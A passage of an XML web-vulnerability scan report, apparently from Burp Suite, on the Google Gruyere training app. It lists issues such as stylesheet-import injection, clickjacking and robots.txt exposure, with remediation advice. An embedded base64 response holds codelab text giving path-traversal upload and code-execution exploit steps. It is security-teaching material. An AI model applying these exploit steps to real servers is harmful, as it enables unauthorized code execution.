29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnZG9zX292ZXJsb2FkX3NvbG4nKTsiPjxJTUcgc3JjPSIvc3RhdGljL2Nsb3NlZC5naWYiPiBFeHBsb2l0IGFuZCBGaXggPC9IND4KPERJViBpZD0iZG9zX292ZXJsb2FkX3NvbG4iIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KPEI+VG8gZXhwbG9pdCw8L0I+IGNyZWF0ZSBhIGZpbGUgbmFtZWQgPENPREU+bWVudWJhci5ndGw8L0NPREU+CmNvbnRhaW5pbmc6CjxQUkU+CltbaW5jbHVkZTptZW51YmFyLmd0bF1dRG9TW1svaW5jbHVkZTptZW51YmFyLmd0bF1dCjwvUFJFPgphbmQgdXBsb2FkIGl0IHRvIHRoZSA8Q09ERT5yZXNvdXJjZXM8L0NPREU+IGRpcmVjdG9yeSB1c2luZyBhIHBhdGggdHJhdmVyc2FsIGF0dGFjaywgZS5nLiwgY3JlYXRpbmcgYSB1c2VyIG5hbWVkIDxDT0RFPi4uL3Jlc291cmNlczwvQ09ERT4uCjwvUD4KPFA+CjxCPlRvIGZpeCw8L0I+IGltcGxlbWVudCB0aGUgcHJvdGVjdGlvbnMgYWdhaW5zdCBwYXRoIHRyYXZlcnNhbCBhbmQgdXBsb2FkaW5nIHRlbXBsYXRlcyBkaXNjdXNzZWQgZWFybGllci4KCjwvUD4KPC9ESVY+Cgo8Qj5OT1RFOjwvQj4gQWZ0ZXIgcGVyZm9ybWluZyB0aGUgcHJldmlvdXMgZXhwbG9pdCwgeW91J2xsIG5lZWQgdG8KcHVzaCB0aGUgPEEgaHJlZj0iL3BhcnQxIzFfX3Jlc2V0X2J1dHRvbiI+cmVzZXQgYnV0dG9uPC9BPi4KCjwvUD4KPC9ESVY+CjxIMz48QSBuYW1lPSI0X19tb3JlX2RvcyI+IDwvQT4gTW9yZSBvbiBEZW5pYWwgb2YKU2VydmljZSA8L0gzPgo8UD4KVW5saWtlIGEgd2VsbCBkZWZpbmVkIHZ1bG5lcmFiaWxpdHkgbGlrZSBYU1Mgb3IgWFNSRiwgZGVuaWFsIG9mCnNlcnZpY2UgZGVzY3JpYmVzIGEgd2lkZSBjbGFzcyBvZiBhdHRhY2tzLiBUaGlzIG1pZ2h0IG1lYW4gYnJpbmdpbmcKeW91ciBzZXJ2aWNlIGRvd24gb3IgZmxvb2RpbmcgeW91ciBpbmJveCBzbyB5b3UgY2FuJ3QgcmVjZWl2ZQpsZWdpdGltYXRlIG1haWwuIFNvbWUgdGhpbmdzIHRvIGNvbnNpZGVyOgo8L1A+CjxQPjwvUD4KPFVMPgo8TEk+PFA+IElmIHlvdSB3ZXJlIGV2aWwgYW5kIGdyZWVkeSwgaG93IHF1aWNrbHkgY291bGQgeW91IHRha2UgZG93biB5b3VyCmFwcGxpY2F0aW9uIG9yIHN0YXJ2ZSBhbGwgb2YgaXRzIHJlc291cmNlcz8gRm9yIGV4YW1wbGUsIGlzIGl0CnBvc3NpYmxlIGZvciBhIHVzZXIgdG8gdXBsb2FkIHRoZWlyIGhhcmQgZHJpdmUgdG8geW91ciBhcHBsaWNhdGlvbj8KRW50ZXJpbmcgdGhlIGF0dGFja2VyJ3MgbWluZHNldCBjYW4gaGVscCBpZGVudGlmeSBEb1MgcG9pbnRzIGluIHlvdXIKYXBwbGljYXRpb24uIEFkZGl0aW9uYWxseSwgdGhpbmsgYWJvdXQgd2hlcmUgdGhlIGNvbXB1dGF0aW9uYWxseSBhbmQKbWVtb3J5IGludGVuc2l2ZSB0YXNrcyBhcmUgaW4geW91ciBhcHBsaWNhdGlvbiBhbmQgcHV0IHNhZmVndWFyZHMgaW4KcGxhY2UuIERvIHNhbml0eSBjaGVja3Mgb24gaW5wdXQgdmFsdWVzLgo8L1A+CjxMST48UD5QdXQgbW9uaXRvcmluZyBpbiBwbGFjZSBzbyB5b3UgY2FuIGRldGVjdCB3aGVuIHlvdSBhcmUgdW5kZXIKYXR0YWNrIGFuZCBlbmZvcmNlIHBlciB1c2VyIHF1b3RhcyBhbmQgcmF0ZSBsaW1pdGluZyB0byBlbnN1cmUgdGhhdCBhCnNtYWxsIHN1YnNldCBvZiB1c2VycyBjYW5ub3Qgc3RhcnZlIHRoZSByZXN0LiBBYnVzaXZlIHBhdHRlcm5zIGNvdWxkCmluY2x1ZGUgaW5jcmVhc2VkIG1lbW9yeSB1c2FnZSwgaGlnaGVyIGxhdGVuY3ksIG9yIG1vcmUgcmVxdWVzdHMgb3IKY29ubmVjdGlvbnMgdGhhbiB1c3VhbC4KPC9QPgo8L1VMPgo8IS0tTUFSSy1CLS0+CjxCUj48UD48L1A+Cgo8SDI+PEEgbmFtZT0iNF9fY29kZV9leGVjdXRpb24iPiA8L0E+IENvZGUgRXhlY3V0aW9uIDwvSDI+CjxQPgpJZiBhbiBhdHRhY2tlciBjYW4gZXhlY3V0ZSBhcmJpdHJhcnkgY29kZSByZW1vdGVseSBvbiB5b3VyIHNlcnZlciwKaXQncyB1c3VhbGx5IGdhbWUgb3Zlci4gVGhleSBtYXkgYmUgYWJsZSB0byB0YWtlIGNvbnRyb2wgb3ZlciB0aGUKcnVubmluZyBwcm9ncmFtIG9yIHBvdGVudGlhbGx5IGJyZWFrIG91dCB0aGUgcHJvY2VzcyB0byBvcGVuIGEgbmV3CnNoZWxsIG9uIHRoZSBjb21wdXRlci4gRnJvbSBoZXJlLCBpdCdzIHVzdWFsbHkgbm90IGhhcmQgdG8gY29tcHJvbWlzZQp0aGUgZW50aXJlIG1hY2hpbmUgdGhlIHNlcnZlciBpcyBydW5uaW5nIG9uLgo8L1A+CjxQPiBTaW1pbGFyIHRvIGluZm9ybWF0aW9uIGRpc2Nsb3N1cmUgYW5kIGRlbmlhbCBvZiBzZXJ2aWNlLCB0aGVyZQppcyBubyByZWNpcGUgb3Igc3BlY2lmaWMgZGVmZW5zZSB0byBwcmV2ZW50IHJlbW90ZSBjb2RlIGV4ZWN1dGlvbi4gVGhlCnByb2dyYW0gbXVzdCBwZXJmb3JtIHZhbGlkYXRpb24gb2YgYWxsIHVzZXIgaW5wdXQgYmVmb3JlIGhhbmRsaW5nIGl0CmFuZCB3aGVyZSBwb3NzaWJsZSwgaW1wbGVtZW50IGZ1bmN0aW9ucyB3aXRoIGxlYXN0IHByaXZpbGVnZQpyaWdodHMuIFRoaXMgdG9waWMgY2FuJ3QgYmUgZG9uZSBqdXN0aWNlIGluIGp1c3QgYSBzaG9ydCBwYXJhZ3JhcGgsCmJ1dCBrbm93IHRoYXQgdGhpcyBpcyBsaWtlbHkgdGhlIHNjYXJpZXN0IHJlc3VsdHMgYSBzZWN1cml0eSBidWcgY2FuCmhhdmUgYW5kIHRydW1wcyBhbnkgb2YgdGhlIGFib3ZlIGF0dGFja3MuCjwvUD4KPFA+PC9QPgo8SDM+PEEgbmFtZT0iNF9fY29kZV9leGVjdXRpb25fY2hhbGxlbmdlIj4gPC9BPiBDb2RlIEV4ZWN1dGlvbiBDaGFsbGVuZ2UgPC9IMz4KPFA+CjxJTUcgc3JjPSIvc3RhdGljL2NoZWVzZV93LnBuZyIgc3R5bGU9InZlcnRpY2FsLWFsaWduOm1pZGRsZTsKcGFkZGluZy1yaWdodDogNXB4OyI+IDxCPkZpbmQgYSBjb2RlIGV4ZWN1dGlvbiBleHBsb2l0LjwvQj4KPC9QPgo8UD48L1A+CjxESVYgc3R5bGU9Im1hcmdpbi1sZWZ0OjE4cHQiPgo8SDQgc3R5bGU9ImN1cnNvcjogcG9pbnRlciIgb25jbGljaz0idG9nZ2xlQmxvY2sodGhpcywgJ2NvZGVfdXBsb2FkX2hpbnQnKTsiPjxJTUcgc3JjPSIvc3RhdGljL2Nsb3NlZC5naWYiPiBIaW50IDwvSDQ+CjxESVYgaWQ9ImNvZGVfdXBsb2FkX2hpbnQiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgo8UD4KWW91IG5lZWQgdG8gdXNlIHR3byBwcmV2aW91cyBleHBsb2l0cy4KPC9QPjwvRElWPgo8UD48L1A+CjxINCBzdHlsZT0iY3Vyc29yOiBwb2ludGVyIiBvbmNsaWNrPSJ0b2dnbGVCbG9jayh0aGlzLCAnY29kZV91cGxvYWRfc29sbicpOyI+PElNRyBzcmM9Ii9zdGF0aWMvY2xvc2VkLmdpZiI+IEV4cGxvaXQgYW5kIEZpeCA8L0g0Pgo8RElWIGlkPSJjb2RlX3VwbG9hZF9zb2xuIiBzdHlsZT0iZGlzcGxheTpub25lIj4KPFA+CjxCPlRvIGV4cGxvaXQsPC9CPiBtYWtlIGEgY29weQpvZiA8Q09ERT48QSBocmVmPSIvY29kZS8/Z3RsLnB5Ij5ndGwucHk8L0E+PC9DT0RFPgoob3IgPENPREU+PEEgaHJlZj0iL2NvZGUvP3Nhbml0aXplLnB5Ij5zYW5pdGl6ZS5weTwvQT48L0NPREU+KSBhbmQKYWRkIHNvbWUgZXhwbG9pdCBjb2RlLiBOb3cgeW91IGNhbiBlaXRoZXIgdXBsb2FkIGEgZmlsZQpuYW1lZCA8Q09ERT4uLi9ndGwucHk8L0NPREU+IG9yIGNyZWF0ZSBhIHVzZXIgbmFtZWQgPENPREU+Li48L0NPREU+CmFuZCB1cGxvYWQgPENPREU+Z3RsLnB5PC9DT0RFPi4gVGhlbiwgbWFrZSB0aGUgc2VydmVyIHF1aXQgYnkgYnJvd3NpbmcKdG8gPENPREU+aHR0cHM6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvcXVpdHNlcnZlcjwvQ09ERT4uIFdoZW4gdGhlCnNlcnZlciByZXN0YXJ0cywgeW91ciBjb2RlIHdpbGwgcnVuLgo8L1A+CjxQPiBUaGlzIGF0dGFjayB3YXMgcG9zc2libGUgYmVjYXVzZSBHcnV5ZXJlIGhhcyBwZXJtaXNzaW9uIHRvIGJvdGgKcmVhZCBhbmQgd3JpdGUgZmlsZXMgaW4gdGhlIEdydXllcmUgZGlyZWN0b3J5LiBBcHBsaWNhdGlvbnMgc2hvdWxkCnJ1biB3aXRoIHRoZSBtaW5pbWFsIHByaXZpbGVnZXMgcG9zc2libGUuCjwvUD4KPFA+IFdoeSB3b3VsZCB5b3UgYXR0YWNrIDxDT0RFPmd0bC5weTwvQ09ERT4Kb3IgPENPREU+c2FuaXRpemUucHk8L0NPREU+IHJhdGhlciB0aGFuIDxDT0RFPmdydXllcmUucHk8L0NPREU+PwpXaGVuIGFuIGF0dGFja2VyIGhhcyBhIGNob2ljZSwgdGhleSB3b3VsZCB1c3VhbGx5IGNob29zZSB0byBhdHRhY2sgdGhlCmluZnJhc3RydWN0dXJlIHJhdGhlciB0aGFuIHRoZSBhcHBsaWNhdGlvbiBpdHNlbGYuIFRoZSBpbmZyYXN0cnVjdHVyZQppcyBsZXNzIGxpa2VseSB0byBiZSB1cGRhdGVkIGFuZCBsZXNzIGxpa2VseSB0byBiZSBub3RpY2VkLiBXaGVuIHdhcwp0aGUgbGFzdCB0aW1lIHlvdSBjaGVja2VkIHRoYXQgbm8gb25lIGhhZApyZXBsYWNlZCA8Q09ERT5weXRob24uZXhlPC9DT0RFPiB3aXRoIGEgdHJvamFuPwo8L1A+CjxQPgo8Qj5UbyBmaXgsPC9CPiBmaXggdGhlIHR3byBwcmV2aW91cyBleHBsb2l0cy4KPC9QPgo8UD48L1A+CjwvRElWPgo8L0RJVj4KPFA+PC9QPgo8SDM+PEEgbmFtZT0iNF9fbW9yZV9jb2RlX2V4ZWN1dGlvbiI+IDwvQT4gTW9yZSBvbiBSZW1vdGUKQ29kZSBFeGVjdXRpb24gPC9IMz4KPFA+CkV2ZW4gdGhvdWdoIHRoZXJlIGlzIG5vIHNpbmdsZSBvciBzaW1wbGUgZGVmZW5zZSB0byByZW1vdGUgY29kZQpleGVjdXRpb24sIGhlcmUgaXMgYSBzaG9ydCBsaXN0IG9mIHNvbWUgcHJldmVudGF0aXZlIG1lYXN1cmVzOgo8L1A+CjxVTD4KPExJPjxQPjxCPkxlYXN0IFByaXZpbGVnZTo8L0I+IEFsd2F5cyBydW4geW91ciBhcHBsaWNhdGlvbiB3aXRoCnRoZSA8QSBocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9xPWxlYXN0K3ByaXZpbGVnZXMiCnRhcmdldD0iX3RvcCI+bGVhc3QgcHJpdmlsZWdlczwvQT4gaXQgbmVlZHMuCjwvUD4KPExJPjxQPjxCPkFwcGxpY2F0aW9uIExldmVsIENoZWNrczo8L0I+IEF2b2lkIHBhc3NpbmcgdXNlciBpbnB1dApkaXJlY3RseSBpbnRvIGNvbW1hbmRzIHRoYXQgZXZhbHVhdGUgYXJiaXRyYXJ5IGNvZGUsCmxpa2UgPENPREU+ZXZhbCgpPC9DT0RFPiBvciA8Q09ERT5zeXN0ZW0oKTwvQ09ERT4uIEluc3RlYWQsIHVzZSB0aGUKdXNlciBpbnB1dCBhcyBhIHN3aXRjaCB0byBjaG9vc2UgZnJvbSBhIHNldCBvZiBkZXZlbG9wZXIgY29udHJvbGxlZApjb21tYW5kcy4KPC9QPgo8TEk+PFA+PEI+Qm91bmRzIENoZWNrczo8L0I+IEltcGxlbWVudCBwcm9wZXIgYm91bmRzIGNoZWNrcyBmb3IKbm9uLXNhZmUgbGFuZ3VhZ2VzIGxpa2UKQysrLiBBdm9pZCA8QSBocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tL3NlYXJjaD9xPXVuc2FmZStzdHJpbmcrZnVuY3Rpb25zIgp0YXJnZXQ9Il90b3AiPnVuc2FmZSBzdHJpbmcgZnVuY3Rpb25zPC9BPi4gS2VlcCBpbiBtaW5kIHRoYXQgZXZlbiBzYWZlCmxhbmd1YWdlcyBsaWtlIFB5dGhvbiBhbmQgSmF2YSB1c2UgbmF0aXZlIGxpYnJhcmllcy4KPC9QPgo8L1VMPgo8IS0tTUFSSy1DLS0+CjxCUj48UD48L1A+CgoKICAgICAgICAgICAgIDxGT05UIFNJWkU9IisyIj4KICAgICAgICAgICAgIDxBIGhyZWY9Ii9wYXJ0NSI+Q29udGludWUgJmd0OyZndDs8L0E+CiAgICAgICAgICAgICA8L0ZPTlQ+PEJSPgo8QlI+CjxQIHN0eWxlPSJmb250LXNpemU6eC1zbWFsbCI+CiZjb3B5OyBHb29nbGUgMjAxNyA8QSBocmVmPSJodHRwczovL3d3dy5nb29nbGUuY29tL2ludGwvZW4vcG9saWNpZXMvdGVybXMvIj5UZXJtcyBvZiBTZXJ2aWNlPC9BPgo8QlI+VGhlIGNvZGUgcG9ydGlvbnMgb2YgdGhpcyBjb2RlbGFiIGFyZSBsaWNlbnNlZCB1bmRlciB0aGUKQ3JlYXRpdmUgQ29tbW9ucyBBdHRyaWJ1dGlvbi1ObyBEZXJpdmF0aXZlIFdvcmtzIDMuMCBVbml0ZWQgU3RhdGVzIGxpY2Vuc2UKJmx0OzxBIGhyZWY9Imh0dHBzOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS1uZC8zLjAvdXMvIj5odHRwczovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnktbmQvMy4wL3VzPC9BPiZndDsuCkJyaWVmIGV4Y2VycHRzIG9mIHRoZSBjb2RlIG1heSBiZSB1c2VkIGZvciBlZHVjYXRpb25hbCBvcgppbnN0cnVjdGlvbmFsIHB1cnBvc2VzIHByb3ZpZGVkIHRoaXMgbm90aWNlIGlzIGtlcHQgaW50YWN0LgpFeGNlcHQgYXMgb3RoZXJ3aXNlIG5vdGVkIHRoZSByZW1haW5kZXIgb2YgdGhpcyBjb2RlbGFiIGlzIGxpY2Vuc2VkIHVuZGVyIHRoZQpDcmVhdGl2ZSBDb21tb25zIEF0dHJpYnV0aW9uIDMuMCBVbml0ZWQgU3RhdGVzIGxpY2Vuc2UKJmx0OzxBIGhyZWY9Imh0dHBzOi8vY3JlYXRpdmVjb21tb25zLm9yZy9saWNlbnNlcy9ieS8zLjAvdXMvIj5odHRwczovL2NyZWF0aXZlY29tbW9ucy5vcmcvbGljZW5zZXMvYnkvMy4wL3VzPC9BPiZndDsuCjwvUD4KPC9CT0RZPjwvSFRNTD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5371093102910436352</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part4]]></path>
    <location><![CDATA[/part4]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0NCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5017095073391464448</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part5]]></path>
    <location><![CDATA[/part5]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0NSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7672996776230603776</serialNumber>
    <type>2097960</type>
    <name><![CDATA[Path-relative style sheet import]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/part5]]></path>
    <location><![CDATA[/part5]]></location>
    <severity>Information</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: no sniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blog.portswigger.net/2015/02/prssi.html">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9wYXJ0NSBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly9nb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbS8NCg0K]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4494341146067147776</serialNumber>
    <type>6292992</type>
    <name><![CDATA[Robots.txt file]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/robots.txt]]></path>
    <location><![CDATA[/robots.txt]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index.</p>
<p>The presence of the robots.txt does not in itself present any kind of security vulnerability. However, it is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The robots.txt file is not itself a security threat, and its correct use can represent good practice for non-security reasons. You should not assume that all web robots will honor the file's instructions. Rather, assume that attackers will pay close attention to any locations identified in the file. Do not rely on robots.txt to provide any kind of protection over unauthorized access.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The web server contains a robots.txt file.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9yb2JvdHMudHh0IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
